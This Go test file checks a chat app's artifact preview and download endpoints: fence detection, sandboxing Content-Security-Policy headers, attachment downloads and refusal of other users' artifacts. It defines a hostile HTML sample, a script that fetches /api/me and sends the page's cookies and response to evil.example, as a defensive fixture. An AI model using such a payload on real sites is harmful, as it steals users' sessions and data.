package chat

import (
	"strings"
	"testing"

	"github.com/raufimusaddiq/antares/internal/store"
)

const hostileHTML = `<script>fetch("/api/me").then(r=>r.text()).then(t=>top.location="https://evil.example/?"+document.cookie+t)</script><p>hi</p>`

func seedArtifacts(t *testing.T, a *app, p *person, chatID string) {
	t.Helper()
	a.hx.mu.Lock()
	a.hx.msgs[decodeSession(t, a, p, chatID)] = []map[string]any{
		{"role": "user", "content": "```html\n<b>user fences are not artifacts</b>\n```"},
		{"role": "assistant", "content": "Here:\n```html\n" + hostileHTML + "\n```\n```go\nfunc main(){}\n```\n```svg\n<svg xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"4\"/></svg>\n```\n```html\n<p>unterminated"},
	}
	a.hx.mu.Unlock()
}

func TestFindArtifactsOnlyClosedHTMLAndSVGFences(t *testing.T) {
	got := findArtifacts("```html\n<p>a</p>\n```\n```py\nx\n```\n````svg\n<svg/>\n```\n````\n```html\nopen")
	if len(got) != 2 || got[0].kind != "html" || got[0].body != "<p>a</p>" || got[1].kind != "svg" || got[1].body != "<svg/>\n```" {
		t.Fatalf("got %+v", got)
	}
}

func TestArtifactPreviewIsSandboxedAndDownloadIsAnAttachment(t *testing.T) {
	a := newApp(t)
	u := a.user("alice")
	chat := u.newChat()
	seedArtifacts(t, a, u, chat)
	base := "/api/chats/" + chat + "/messages/1/artifacts/"

	w := u.get(base + "0/preview")
	if w.Code != 200 || w.Body.String() != hostileHTML {
		t.Fatalf("preview: %d %q", w.Code, w.Body.String())
	}
	csp := w.Header().Get("Content-Security-Policy")
	for _, want := range []string{"sandbox;", "default-src 'none'", "frame-ancestors 'self'"} {
		if !strings.Contains(csp, want) {
			t.Errorf("preview CSP %q lacks %q", csp, want)
		}
	}
	if strings.Contains(csp, "allow-") || strings.Contains(csp, "script-src") {
		t.Errorf("preview CSP grants something: %q", csp)
	}
	if w.Header().Get("X-Content-Type-Options") != "nosniff" || !strings.HasPrefix(w.Header().Get("Content-Type"), "text/html") {
		t.Errorf("preview headers: %v", w.Header())
	}
	if ct := u.get(base + "1/preview").Header().Get("Content-Type"); !strings.HasPrefix(ct, "image/svg+xml") {
		t.Errorf("svg preview type %q", ct)
	}

	w = u.get(base + "1")
	if w.Code != 200 || !strings.HasPrefix(w.Header().Get("Content-Disposition"), "attachment; filename=\"antares-turn1-artifact2.svg\"") ||
		w.Header().Get("Content-Type") != "application/octet-stream" || w.Header().Get("Content-Security-Policy") != "sandbox" {
		t.Errorf("download: %d %v", w.Code, w.Header())
	}
}

func TestArtifactRefusals(t *testing.T) {
	a := newApp(t)
	alice, bob := a.user("alice"), a.user("bobby")
	chat := alice.newChat()
	seedArtifacts(t, a, alice, chat)
	for _, suffix := range []string{"", "/preview"} {
		ok := "/api/chats/" + chat + "/messages/1/artifacts/0" + suffix
		if w := alice.get(ok); w.Code != 200 {
			t.Fatalf("owner %s: %d", ok, w.Code)
		}
		// Another user's reference is refused, identically to one that never existed.
		got := bob.get(ok)
		absent := bob.get("/api/chats/" + store.NewID() + "/messages/1/artifacts/0" + suffix)
		if got.Code != 404 || strings.Contains(got.Body.String(), "fetch(") || !sameAnswer(got, absent) {
			t.Errorf("foreign %s: %d %s (absent: %d %s)", ok, got.Code, got.Body.String(), absent.Code, absent.Body.String())
		}
		// Things that are not artifacts: a user turn, a non-html fence, an unterminated fence, junk indexes.
		for _, p := range []string{"/messages/0/artifacts/0", "/messages/1/artifacts/2", "/messages/1/artifacts/3", "/messages/9/artifacts/0", "/messages/1/artifacts/-1", "/messages/x/artifacts/0"} {
			if w := alice.get("/api/chats/" + chat + p + suffix); w.Code != 404 {
				t.Errorf("%s%s: %d, want 404", p, suffix, w.Code)
			}
		}
	}
}
